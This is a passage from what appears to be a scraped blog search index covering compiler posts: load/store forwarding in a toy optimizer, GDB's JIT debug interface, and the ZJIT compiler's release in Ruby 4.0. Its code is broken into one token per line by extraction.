info:\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"store\"\\n:\\noffset\\n=\\nget_num\\n(\\nop\\n,\\n1\\n)\\ncompile_time_heap\\n=\\n# ... as before ...\\nobj\\n=\\nop\\n.\\narg\\n(\\n0\\n)\\nnew_value\\n=\\nop\\n.\\narg\\n(\\n2\\n)\\ncompile_time_heap\\n[(\\nobj\\n,\\noffset\\n)]\\n=\\nnew_value\\n# NEW!\\nelif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\n# ...\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nThis makes the test pass. It makes another test fail, but only because\u2014oops\u2014we now know more. You can delete the old test because the new test supersedes it.\\nNow, note that we are not removing the store. This is because we have nothing in our optimizer that keeps track of what might have observed the side-effects of the store. What if the object got\\nescape\\nd? Or someone did a load later on? We would only be able to remove the store (\\ncontinue\\n) if we could guarantee it was not observable.\\nIn our current framework, this only happens in one case: someone is doing a store of the exact same value that already exists in our compile-time heap. That is, either the same constant, or the same SSA value. If we see this, then we can completely skip the second store instruction.\\nHere\u2019s a test case for that, where we have gained information from the load instruction that we can then use to get rid of the store instruction:\\ndef\\ntest_load_then_store\\n():\\nbb\\n=\\nBlock\\n()\\narg1\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nvar1\\n=\\nbb\\n.\\nload\\n(\\narg1\\n,\\n0\\n)\\nbb\\n.\\nstore\\n(\\narg1\\n,\\n0\\n,\\nvar1\\n)\\nbb\\n.\\nescape\\n(\\nvar1\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = load(var0, 0) var2 = escape(var1)\"\"\"\\nLet\u2019s make it pass. To do that, first we\u2019ll make an equality function that works for both constants and operations. Constants are equal if their values are equal, and operations are equal if they are the identical (by address/pointer) operation.\\ndef\\neq_value\\n(\\nleft\\n:\\nValue\\n|\\nNone\\n,\\nright\\n:\\nValue\\n)\\n-&gt;\\nbool\\n:\\nif\\nisinstance\\n(\\nleft\\n,\\nConstant\\n)\\nand\\nisinstance\\n(\\nright\\n,\\nConstant\\n):\\nreturn\\nleft\\n.\\nvalue\\n==\\nright\\n.\\nvalue\\nreturn\\nleft\\nis\\nright\\nThis is a partial equality: if two operations are not equal under\\neq_value\\n, it doesn\u2019t mean that they are different, only that we don\u2019t know that they are the same.\\nThen, after that, we need only check if the current value in the compile-time heap is the same as the value being stored in. If it is, wonderful. No need to store.\\ncontinue\\nand don\u2019t append the operation to\\nopt_bb\\n:\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"store\"\\n:\\nobj\\n=\\nop\\n.\\narg\\n(\\n0\\n)\\noffset\\n=\\nget_num\\n(\\nop\\n,\\n1\\n)\\nstore_info\\n=\\n(\\nobj\\n,\\noffset\\n)\\ncurrent_value\\n=\\ncompile_time_heap\\n.\\nget\\n(\\nstore_info\\n)\\nnew_value\\n=\\nop\\n.\\narg\\n(\\n2\\n)\\nif\\neq_value\\n(\\ncurrent_value\\n,\\nnew_value\\n):\\n# NEW!\\ncontinue\\ncompile_time_heap\\n=\\n# ... as before ...\\n# ...\\nelif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\nload_info\\n=\\n(\\nop\\n.\\narg\\n(\\n0\\n),\\nget_num\\n(\\nop\\n,\\n1\\n))\\nif\\nload_info\\nin\\ncompile_time_heap\\n:\\nop\\n.\\nmake_equal_to\\n(\\ncompile_time_heap\\n[\\nload_info\\n])\\ncontinue\\ncompile_time_heap\\n[\\nload_info\\n]\\n=\\nop\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nThis makes our load-then-store pass and it also makes other tests pass too, like eliminating a store after another store!\\ndef\\ntest_store_after_store\\n():\\nbb\\n=\\nBlock\\n()\\narg1\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nbb\\n.\\nstore\\n(\\narg1\\n,\\n0\\n,\\n5\\n)\\nbb\\n.\\nstore\\n(\\narg1\\n,\\n0\\n,\\n5\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = store(var0, 0, 5)\"\"\"\\nUnfortunately, this only works if the values\u2014constants or SSA values\u2014are known to be the same. If we store\\ndifferent\\nvalues, we can\u2019t optimize. In the live stream, we left this an exercise for the viewer:\\n@\\npytest\\n.\\nmark\\n.\\nxfail\\ndef\\ntest_exercise_for_the_reader\\n():\\nbb\\n=\\nBlock\\n()\\narg0\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nvar0\\n=\\nbb\\n.\\nstore\\n(\\narg0\\n,\\n0\\n,\\n5\\n)\\nvar1\\n=\\nbb\\n.\\nstore\\n(\\narg0\\n,\\n0\\n,\\n7\\n)\\nvar2\\n=\\nbb\\n.\\nload\\n(\\narg0\\n,\\n0\\n)\\nbb\\n.\\nescape\\n(\\nvar2\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = store(var0, 0, 7) var2 = escape(7)\"\"\"\\nWe would only be able to optimize this away if we had some notion of a store being\\ndead\\n. In this case, that is a store in which the value is never read before being overwritten.\\nRemoving dead stores\\nTODO, I suppose. I have not gotten this far yet. If I get around to it, I will come back and update the post.\\nIn the real world\\nThis small optimization pass may seem silly or fiddly\u2014when would we ever see something like this in a real IR?\u2014but it\u2019s pretty useful. Here\u2019s the Ruby code that got me thinking about it again some years later for ZJIT:\\nclass\\nC\\ndef\\ninitialize\\n@a\\n=\\n1\\n@b\\n=\\n2\\n@c\\n=\\n3\\nend\\nend\\nCRuby has a shape system and ZJIT makes use of it, so we end up optimizing this code (if it\u2019s monomorphic) into a series of shape checks and stores. The HIR might end up looking something like the mess below, where I\u2019ve annotated the shape guards (can be thought of as loads) and stores with asterisks:\\nfn initialize@tmp/init.rb:3:</p>"},{"location":"bernsteinbear.com/Load%20and%20store%20forwarding%20in%20the%20Toy%20Optimizer_20260205/#_1","title":"...","text":"<p>bb2(v6:BasicObject):   v10:Fixnum[1] = Const Value(1)   v31:HeapBasicObject = GuardType v6, HeapBasicObject * v32:HeapBasicObject = GuardShape v31, 0x400000 * StoreField v32, :@a@0x10, v10   WriteBarrier v32, v10   v35:CShape[0x40008e] = Const CShape(0x40008e) * StoreField v32, :_shape_id@0x4, v35   v16:Fixnum[2] = Const Value(2)   v37:HeapBasicObject = GuardType v6, HeapBasicObject * v38:HeapBasicObject = GuardShape v37, 0x40008e * StoreField v38, :@b@0x18, v16   WriteBarrier v38, v16   v41:CShape[0x40008f] = Const CShape(0x40008f) * StoreField v38, :_shape_id@0x4, v41   v22:Fixnum[3] = Const Value(3)   v43:HeapBasicObject = GuardType v6, HeapBasicObject * v44:HeapBasicObject = GuardShape v43, 0x40008f * StoreField v44, :@c@0x20, v22   WriteBarrier v44, v22   v47:CShape[0x400090] = Const CShape(0x400090) * StoreField v44, :_shape_id@0x4, v47   CheckInterrupts   Return v22\\nIf we had store-load forwarding in ZJIT, we could get rid of the intermediate shape guards; they would know the shape from the previous\\nStoreField\\ninstruction. If we had dead store elimination, we could get rid of the intermediate shape writes; they are never read. (And the repeated type guards to check if it\u2019s a heap object still are just silly and need to get removed eventually.)\\nThis is on the roadmap and will make object initialization even faster than it is right now.\\nWrapping up\\nThanks for reading the text version of the video that CF and I made a while back. Now you know how to do load/store elimination on traces.\\nI think this does not need too much extra work to get it going on full CFGs; a block is pretty much the same as a trace, so you can do a block-local version without much fuss. If you want to go global, you need dominator information and gen-kill sets.\\nMaybe check out the implementation in other compilers:\\nV8\u2019s old Hydrogen load elimination\\nV8\u2019s old Hydrogen escape analysis\\nWhich also does some load-store forwarding\\nV8\u2019s old Hydrogen simple alias analysis\\nAndroid ART\u2019s load-store elimination\\nMaybe I will touch on this in a future post\u2026\\nThank you\\nThank you to CF, who walked me through this live on a stream two years ago! This blog post wouldn\u2019t be possible without you.\\nIn this toy optimizer example, we are assuming that all reads and writes are the same size and different offsets don\u2019t overlap at all. This is often the case for managed runtimes, where object fields are pointer-sized and all reads/writes are pointer-aligned.\\n\u21a9\\nWe could do better. If we had type information, we could also use that to make alias classes. Writes to a List will never overlap with writes to a Map, for example. This requires your compiler to have strict aliasing\u2014if you can freely cast between types, as in C, then this tactic goes out the window.\\nThis is called\\nType-based alias analysis\\n(PDF).\\n\u21a9</p>"},{"location":"bernsteinbear.com/Sorry%20for%20marking%20all%20the%20posts%20as%20unread_20260205/","title":"Sorry for marking all the posts as unread\\n\\n\u6765\u6e90: https://bernsteinbear.com\\n\u94fe\u63a5: \\n\u65e5\u671f: Wed, 31 Jan 2024 00:00:00 +0000\\n\\n---\\n\\nI noticed that the URLs were all a little off (had two slashes","text":"<pre><code>          instead of one) and went in and fixed it. I did not think\n          everyone's RSS software was going to freak out the way it did.\n\n          PS: this is a special RSS-only post that is not visible on the\n          site. Enjoy.\n</code></pre>"},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/","title":"The GDB JIT interface\\n\\n\u6765\u6e90: https://bernsteinbear.com\\n\u94fe\u63a5: https://bernsteinbear.com/blog/gdb-jit/?utm_source=rss\\n\u65e5\u671f: Tue, 30 Dec 2025 00:00:00 +0000\\n\\n---\\n\\nGDB is great for stepping through machine code to figure out what is going on.","text":"<p>It uses debug information under the hood to present you with a tidy backtrace and also determine how much machine code to print when you type\\ndisassemble\\n.\\nThis debug information comes from your compiler. Clang, GCC, rustc, etc all produce debug data in a format called\\nDWARF\\nand then embed that debug information inside the binary (ELF, Mach-O, \u2026) when you do\\n-ggdb\\nor equivalent.\\nUnfortunately, this means that by default, GDB has no idea what is going on if you break in a JIT-compiled function. You can step instruction-by-instruction and whatnot, but that\u2019s about it. This is because the current instruction pointer is nowhere to be found in any of the existing debug info tables from the host runtime code, so your terminal is filled with\\n???\\n. See this example from the V8 docs:\\n#8  0x08281674 in v8::internal::Runtime_SetProperty (args=...) at src/runtime.cc:3758</p>"},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#9-0xf5cae28e-in","title":"9  0xf5cae28e in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#10-0xf5cc3a0a-in","title":"10 0xf5cc3a0a in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#11-0xf5cc38f4-in","title":"11 0xf5cc38f4 in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#12-0xf5cbef19-in","title":"12 0xf5cbef19 in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#13-0xf5cb09a2-in","title":"13 0xf5cb09a2 in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#14-0x0809e0a5-in-v8internalinvoke-at-srcexecutioncc97nfortunately-there-is-anjit-interfacento-gdb-if-you-implement-a-couple-of","title":"14 0x0809e0a5 in v8::internal::Invoke (...) at src/execution.cc:97\\nFortunately, there is a\\nJIT interface\\nto GDB. If you implement a couple of","text":"<p>functions in your JIT and run them every time you finish compiling a function, you can get the debugging niceties for your JIT code too. See again a V8 example:\\n#6  0x082857fc in v8::internal::Runtime_SetProperty (args=...) at src/runtime.cc:3758</p>"},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#7-0xf5cae28e-in","title":"7  0xf5cae28e in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#8-0xf5cc3a0a-in-loop-at-testjs6","title":"8  0xf5cc3a0a in loop () at test.js:6","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#9-0xf5cc38f4-in-testjs-at-testjs13","title":"9  0xf5cc38f4 in test.js () at test.js:13","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#10-0xf5cbef19-in","title":"10 0xf5cbef19 in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#11-0xf5cb09a2-in","title":"11 0xf5cb09a2 in ?? ()","text":""},{"location":"bernsteinbear.com/The%20GDB%20JIT%20interface_20260205/#12-0x0809e1f9-in-v8internalinvoke-at-srcexecutioncc97nunfortunately-the-gdb-docs-arensomewhat-sparsen-so-i-went","title":"12 0x0809e1f9 in v8::internal::Invoke (...) at src/execution.cc:97\\nUnfortunately, the GDB docs are\\nsomewhat sparse\\n. So I went","text":"<p>spelunking through a bunch of different projects to try and understand what is going on.\\nThe big picture (and the old interface)\\nGDB expects your runtime to expose a function called\\n__jit_debug_register_code\\nand a global variable called\\n__jit_debug_descriptor\\n. GDB automatically adds its own internal breakpoints at this function, if it exists. Then, when you compile code, you call this function from your runtime.\\nIn slightly more detail:\\nCompile a function in your JIT compiler. This gives you a function name, maybe other metadata, an executable code address, and a code size\\nGenerate an\\nentire\\nELF/Mach-O/\u2026 object in-memory (!) for that one function, describing its name, code region, maybe other DWARF metadata such as line number maps\\nWrite a\\njit_code_entry\\nlinked list node that points at your object (\u201csymfile\u201d)\\nLink it into the\\n__jit_debug_descriptor\\nlinked list\\nCall\\n__jit_debug_register_code\\n, which gives GDB control of the process so it can pick up the new function\u2019s metadata\\nOptionally, break into (or crash inside) one of your JITed functions\\nAt some point, later, when your function gets GCed, unregister your code by editing the linked list and calling\\n__jit_debug_register_code\\nagain\\nThis is why you see compiler projects such as V8 including large swaths of code just to make object files:\\nV8\\nCinder\\nZend PHP\\nCoreCLR/.NET\\nQEMU\\nJavaScriptCore\\nLuaJIT\\nART\\nwhich looks like it does something smart about grouping the JIT code entries together (\\nRepackEntries\\n), but I\u2019m not sure exactly what it does\\nHHVM\\nTomatoDotNet\\nJato JVM\\na minimal example\\nmonoruby\\nMono\\nIt looks like Dart\\nused to\\nhave support for this but has since removed it\\nwasmtime\\nBecause this is a huge hassle, GDB also has a newer interface that does not require making an ELF/Mach-O/\u2026+DWARF object.\\nCustom debug info (the new interface)\\nThis new interface requires writing a binary format of your choice. You make the writer and you make the reader. Then, when you are in GDB, you load your reader as a shared object.\\nThe reader must implement\\nthe interface specified by GDB\\n:\\nGDB_DECLARE_GPL_COMPATIBLE_READER\\n;\\nextern\\nstruct\\ngdb_reader_funcs\\n\\ngdb_init_reader\\n(\\nvoid\\n);\\nstruct\\ngdb_reader_funcs\\n{\\n/ Must be set to GDB_READER_INTERFACE_VERSION.  /\\nint\\nreader_version\\n;\\n/ For use by the reader.  /\\nvoid\\n\\npriv_data\\n;\\ngdb_read_debug_info\\n\\nread\\n;\\ngdb_unwind_frame\\n\\nunwind\\n;\\ngdb_get_frame_id\\n\\nget_frame_id\\n;\\ngdb_destroy_reader\\n\\ndestroy\\n;\\n};\\nThe\\nread\\nfunction pointer does the bulk of the work and is responsible for matching code ranges to function names, line numbers, and more.\\nHere are\\nsome details from Sanjoy Das\\n.\\nOnly a few runtimes implement this interface. Most of them stub out the\\nunwind\\nand\\nget_frame_id\\nfunction pointers:\\nyk write\\nyk read\\nasmjit-utilities write\\nasmjit-utilities read\\nErlang/OTP write\\nErlang/OTP read\\nFEX write\\nFEX read\\nbuxn-jit write\\nbuxn-jit read\\nbox64 write\\nbox64 read\\nccl write\\nccl read\\nI think it also requires at least the reader to proclaim it is GPL via the macro\\nGDB_DECLARE_GPL_COMPATIBLE_READER\\n.\\nSince I wrote about the\\nperf map interface\\nrecently, I have it on my mind. Why can\u2019t we reuse it in GDB?\\nAdapting to the Linux perf interface\\nI suppose it would be possible to try and upstream a patch to GDB to support the Linux perf map interface for JITs. After all, why shouldn\u2019t it be able to automatically pick up symbols from\\n/tmp/perf-...\\n? That would be great baseline debug info for \u201cfree\u201d.\\nIn the meantime, maybe it is reasonable to create a re-usable custom debug reader:\\nWhen registering code, write the address and name to\\n/tmp/perf-...\\nas you normally would\\nWrite the filename as the symfile (does this make\\n/tmp\\nthe magic number?)\\nHave the debug info reader just parse the perf map file\\nIt would be less flexible than both the DWARF and custom readers support: it would only be able to handle filename and code region. No embedding source code for GDB to display in your debugger. But maybe that is okay for a partial solution?\\nUpdate:\\nHere is\\nmy small attempt\\nat such a plugin.\\nThe n-squared problem\\nV8 notes in their\\nGDB JIT docs\\nthat because the JIT interface is a linked list and we only keep a pointer to the head, we get O(n\\n2\\n) behavior. Bummer. This becomes especially noticeable since they register additional code objects not just for functions, but also trampolines, cache stubs, etc.\\nGarbage collection\\nSince GDB expects the code pointer in your symbol object file not to move, you have to make sure to have a stable symbol file pointer and stable executable code pointer. To make this happen, V8 disables its moving GC.\\nAdditionally, if your compiled function gets collected, you have to make sure to unregister the function. Instead of doing this eagerly, ART treats the GDB JIT linked list as a weakref and periodically removes dead code entries from it.</p>"},{"location":"bernsteinbear.com/ZJIT%20is%20now%20available%20in%20Ruby%204.0_20260205/","title":"ZJIT is now available in Ruby 4.0\\n\\n\u6765\u6e90: https://bernsteinbear.com\\n\u94fe\u63a5: https://bernsteinbear.com/blog/launch-zjit/?utm_source=rss\\n\u65e5\u671f: Wed, 24 Dec 2025 00:00:00 +0000\\n\\n---\\n\\nOriginally published on\\nRails At Scale\\n.\\nZJIT is a new just-in-time (JIT) Ruby compiler built into the reference Ruby","text":"<p>implementation,\\nYARV\\n, by the same compiler group that brought you YJIT. We (Aaron Patterson, Aiden Fox Ivey, Alan Wu, Jacob Denbeaux, Kevin Menard, Max Bernstein, Maxime Chevalier-Boisvert, Randy Stauner, Stan Lo, and Takashi Kokubun) have been working on ZJIT since the beginning of this year.\\nIn case you missed the last post, we\u2019re building a new compiler for Ruby because we want to both raise the performance ceiling (bigger compilation unit size and SSA IR) and encourage more outside contribution (by becoming a more traditional method compiler).\\nIt\u2019s been a long time since we gave an official update on ZJIT. Things are going well. We\u2019re excited to share our progress with you. We\u2019ve done a lot\\nsince May\\n.\\nIn brief\\nZJIT is compiled by default\u2014but not enabled by default\u2014in Ruby 4.0. Enable it by passing the\\n--zjit\\nflag or the\\nRUBY_ZJIT_ENABLE\\nenvironment variable or calling\\nRubyVM::ZJIT.enable\\nafter starting your application.\\nIt\u2019s faster than the interpreter, but not yet as fast as YJIT.\\nYet.\\nBut we have a plan, and we have some more specific numbers below. The TL;DR is we have a great new foundation and now need to pull out all the Ruby-specific stops to match YJIT.\\nWe encourage you to experiment with ZJIT, but maybe hold off on deploying it in production for now. This is a very new compiler. You should expect crashes and wild performance degradations (or, perhaps, improvements). Please test locally, try to run CI, etc, and let us know what you run into on\\nthe Ruby issue tracker\\n(or, if you don\u2019t want to make a Ruby Bugs account, we would also take reports\\non GitHub\\n).\\nState of the compiler\\nTo underscore how much has happened since the\\nannouncement of being merged into CRuby\\n, we present to you a series of comparisons:\\nSide-exits\\nBack in May, we could not side-exit from JIT code into the interpreter. This meant that the code we were running had to continue to have the same preconditions (expected types, no method redefinitions, etc) or the JIT would safely abort.\\nNow,\\nwe can side-exit and use this feature liberally.\\nFor example, we gracefully handle the phase transition from integer to string; a guard instruction fails and transfers control to the interpreter.\\ndef\\nadd\\nx\\n,\\ny\\nx\\n+\\ny\\nend\\nadd\\n3\\n,\\n4\\nadd\\n3\\n,\\n4\\nadd\\n3\\n,\\n4\\nadd\\n\"three\"\\n,\\n\"four\"\\nThis enables running a lot more code!\\nMore code\\nBack in May, we could only run a handful of small benchmarks.\\nNow,\\nwe can run all sorts of code, including passing the full Ruby test suite, the test suite and shadow traffic of a large application at Shopify, and the test suite of GitHub.com! Also a bank, apparently.\\nBack in May, we did not optimize much; we only really optimized operations on fixnums (small integers) and method sends to the\\nmain\\nobject.\\nNow,\\nwe optimize a lot more: all sorts of method sends, instance variable reads and writes, attribute accessor/reader/writer use, struct reads and writes, object allocations, certain string operations, optional parameters, and more.\\nFor example, we can\\nconstant-fold\\nnumeric operations. Because we also have a (small, limited) inliner borrowed from YJIT, we can constant-fold the entirety of\\nadd\\ndown to\\n3\\n\u2014and still handle redefinitions of\\none\\n,\\ntwo\\n,\\nInteger#+\\n, \u2026\\ndef\\none\\n1\\nend\\ndef\\ntwo\\n2\\nend\\ndef\\nadd\\none\\n+\\ntwo\\nend\\nRegister spilling\\nBack in May, we could not compile many large functions due to limitations of our backend that we borrowed from YJIT.\\nNow,\\nwe can compile absolutely enormous functions just fine. And quickly, too. Though we have not been focusing specifically on compiler performance, we compile even large methods in under a millisecond.\\nC methods\\nBack in May, we could not even optimize calls to built-in C methods.\\nNow,\\nwe have a feature similar to JavaScriptCore\u2019s DOMJIT, which allows us to emit inline HIR versions of certain well-known C methods. This allows the optimizer to reason about these methods and their effects (more on this in a future post) much more\u2026 er, effectively.\\nFor example,\\nInteger#succ\\n, which is defined as adding\\n1\\nto an integer, is a C method. It\u2019s used in\\nInteger#times\\nto drive the\\nwhile\\nloop. Instead of emitting a call to it, our C method \u201cinliner\u201d can emit our existing\\nFixnumAdd\\ninstruction and take advantage of the rest of the type inference and constant-folding.\\nfn\\ninline_integer_succ\\n(\\nfun\\n:\\n&amp;\\nmut\\nhir\\n::\\nFunction\\n,\\nblock\\n:\\nhir\\n::\\nBlockId\\n,\\nrecv\\n:\\nhir\\n::\\nInsnId\\n,\\nargs\\n:\\n&amp;\\n[\\nhir\\n::\\nInsnId\\n],\\nstate\\n:\\nhir\\n::\\nInsnId\\n)\\n-&gt;\\nOption\\n&lt;\\nhir\\n::\\nInsnId\\n&gt;\\n{\\nif\\n!\\nargs\\n.is_empty\\n()\\n{\\nreturn\\nNone\\n;\\n}\\nif\\nfun\\n.likely_a\\n(\\nrecv\\n,\\ntypes\\n::\\nFixnum\\n,\\nstate\\n)\\n{\\nlet\\nleft\\n=\\nfun\\n.coerce_to\\n(\\nblock\\n,\\nrecv\\n,\\ntypes\\n::\\nFixnum\\n,\\nstate\\n);\\nlet\\nright\\n=\\nfun\\n.push_insn\\n(\\nblock\\n,\\nhir\\n::\\nInsn\\n::\\nConst\\n{\\nval\\n:\\nhir\\n::\\nConst\\n::\\nValue\\n(\\nVALUE\\n::\\nfixnum_from_usize\\n(\\n1\\n))\\n});\\nlet\\nresult\\n=\\nfun\\n.push_insn\\n(\\nblock\\n,\\nhir\\n::\\nInsn\\n::\\nFixnumAdd\\n{\\nleft\\n,\\nright\\n,\\nstate\\n});\\nreturn\\nSome\\n(\\nresult\\n);\\n}\\nNone\\n}\\nFewer C calls\\nBack in May, the machine code ZJIT generated called a lot of C functions from the CRuby runtime to implement our HIR instructions in LIR. We have pared this down significantly and now \u201copen code\u201d the implementations in LIR.\\nFor example,\\nGuardNotFrozen\\nused to call out to\\nrb_obj_frozen_p\\n. Now, it requires that its input is a heap-allocated object and can instead do a load, a test, and a conditional jump.\\nfn\\ngen_guard_not_frozen\\n(\\njit\\n:\\n&amp;\\nJITState\\n,\\nasm\\n:\\n&amp;\\nmut\\nAssembler\\n,\\nrecv\\n:\\nOpnd\\n,\\nstate\\n:\\n&amp;\\nFrameState\\n)\\n-&gt;\\nOpnd\\n{\\nlet\\nrecv\\n=\\nasm\\n.load\\n(\\nrecv\\n);\\n// It's a heap object, so check the frozen flag\\nlet\\nflags\\n=\\nasm\\n.load\\n(\\nOpnd\\n::\\nmem\\n(\\n64\\n,\\nrecv\\n,\\nRUBY_OFFSET_RBASIC_FLAGS\\n));\\nasm\\n.test\\n(\\nflags\\n,\\n(\\nRUBY_FL_FREEZE\\nas\\nu64\\n)\\n.into\\n());\\n// Side-exit if frozen\\nasm\\n.jnz\\n(\\nside_exit\\n(\\njit\\n,\\nstate\\n,\\nGuardNotFrozen\\n));\\nrecv\\n}\\nMore teammates\\nBack in May, we had four people working full-time on the compiler.\\nNow,\\nwe have more internally at Shopify\u2014and also more from the community! We have had several interested people reach out, learn about ZJIT, and successfully land complex changes. For this reason, we have opened up\\na chat room\\nto discuss and improve ZJIT.\\nA cool graph visualization tool\\nYou\\nhave to\\ncheck out our intern Aiden\u2019s\\nintegration of Iongraph into ZJIT\\n. Now we have clickable, zoomable, scrollable graphs of all our functions and all our optimization passes. It\u2019s great!\\nTry zooming (Ctrl-scroll), clicking the different optimization passes on the left, clicking the instruction IDs in each basic block (definitions and uses), and seeing how the IR for the below Ruby code changes over time.\\nclass\\nPoint\\nattr_accessor\\n:x\\n,\\n:y\\ndef\\ninitialize\\nx\\n,\\ny\\n@x\\n=\\nx\\n@y\\n=\\ny\\nend\\nend\\nP\\n=\\nPoint\\n.\\nnew\\n(\\n3\\n,\\n4\\n).\\nfreeze\\ndef\\ntest\\n=\\nP\\n.\\nx\\n+\\nP\\n.\\ny\\nMore\\n\u2026and so, so many garbage collection fixes.\\nThere\u2019s still a lot to do, though.\\nTo do\\nWe\u2019re going to optimize\\ninvokeblock\\n(\\nyield\\n) and\\ninvokesuper\\n(\\nsuper\\n) instructions, each of which behaves similarly, but not identically, to a normal\\nsend\\ninstruction. These are pretty common.\\nWe\u2019re going to optimize\\nsetinstancevariable\\nin the case where we have to transition the object\u2019s shape. This will help normal\\n@a = b\\nsituations. It will also help\\n@a ||= b\\n, but I think we can even do better with the latter using some kind of value numbering.\\nWe only optimize monomorphic calls right now\u2014cases where a method send only sees one class of receiver while being profiled. We\u2019re going to optimize polymorphic sends, too. Right now we\u2019re laying the groundwork (a new register allocator; see below) to make this much easier. It\u2019s not as much of an immediate focus, though, because most (high 80s, low 90s percent) of sends are monomorphic.\\nWe\u2019re in the middle of re-writing the register allocator after reading the entire history of linear scan papers and several implementations. That will unlock performance improvements and also allow us to make the IRs easier to use.\\nWe don\u2019t handle phase changes particularly well yet; if your method call patterns change significantly after your code has been compiled, we will frequently side-exit into the interpreter. Instead, we would like to use these side-exits as additional profile information and re-compile the function.\\nRight now we have a lot of traffic to the VM frame. JIT frame pushes are reasonably fast, but with every effectful operation, we have to flush our local variable state and stack state to the VM frame. The instances in which code might want to read this reified frame state are rare: frame unwinding due to exceptions,\\nBinding#local_variable_get\\n, etc. In the future, we will instead defer writing this state until it needs to be read.\\nWe only have a limited inliner that inlines constants,\\nself\\n, and parameters. In the fullness of time, we will add a general-purpose method inlining facility. This will allow us to reduce the amount of polymorphic sends, do some branch folding, and reduce the amount of method sends.\\nWe only support optimizing positional parameters, required keyword parameters, and optional parameters right now but we will work on optimizing optional keyword arguments as well. Most of this work is in marshaling the complex Ruby calling convention into one coherent form that the JIT can understand.\\nPerformance\\nWe have public performance numbers for a selection of macro- and micro-benchmarks on\\nrubybench\\n. Here is a screenshot of what those per-benchmark graphs look like. The Y axis is speedup multiplier vs the interpreter and the X axis is time. Higher is better:\\nA line chart of ZJIT performance on railsbench\u2014represented as a   speedup multiplier when compared to the interpreter\u2014improving over   time, passing interpreter performance, catching up to YJIT.\\nYou can see that we are improving performance on nearly all benchmarks over time. Some of this comes from from optimizing in a similar way as YJIT does today (e.g. specializing ivar reads and writes), and some of it is optimizing in a way that takes advantage of ZJIT\u2019s high-level IR (e.g. constant folding, branch folding, more precise type inference).\\nWe are using both raw time numbers and also our internal performance counters (e.g. number of calls to C functions from generated code) to drive optimization.\\nTry it out\\nWhile Ruby now ships with ZJIT compiled into the binary by default, it is not\\nenabled\\nby default at run-time. Due to performance and stability, YJIT is still the default compiler choice in Ruby 4.0.\\nIf you want to run your test suite with ZJIT to see what happens, you absolutely can. Enable it by passing the\\n--zjit\\nflag or the\\nRUBY_ZJIT_ENABLE\\nenvironment variable or calling\\nRubyVM::ZJIT.enable\\nafter starting your application.\\nOn YJIT\\nWe devoted a lot of our resources this year to developing ZJIT. While we did not spend much time on YJIT (outside of a great\\nallocation speed up\\n), YJIT isn\u2019t going anywhere soon.\\nThank you\\nThis compiler was made possible by contributions to your\\nPBS station\\nopen source project from programmers like you. Thank you!\\nAaron Patterson\\nAbrar Habib\\nAiden Fox Ivey\\nAlan Wu\\nAlex Rocha\\nAndr\u00e9 Luiz Tiago Soares\\nBenoit Daloze\\nCharlotte Wen\\nDaniel Colson\\nDonghee Na\\nEileen Uchitelle\\n\u00c9tienne Barri\u00e9\\nGodfrey Chan\\nGoshanraj Govindaraj\\nHiroshi SHIBATA\\nHoa Nguyen\\nJacob Denbeaux\\nJean Boussier\\nJeremy Evans\\nJohn Hawthorn\\nKen Jin\\nKevin Menard\\nMax Bernstein\\nMax Leopold\\nMaxime Chevalier-Boisvert\\nNobuyoshi Nakada\\nPeter Zhu\\nRandy Stauner\\nSatoshi Tagomori\\nShannon Skipper\\nStan Lo\\nTakashi Kokubun\\nTavian Barnes\\nTobias L\u00fctke\\n(via a lightly touched up\\ngit log --pretty=\"%an\" zjit | sort -u\\n)</p>"},{"location":"berthub.eu/","title":"berthub.eu","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Digitaal zoet en zuur in het coalitieakkoord 20260202</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw 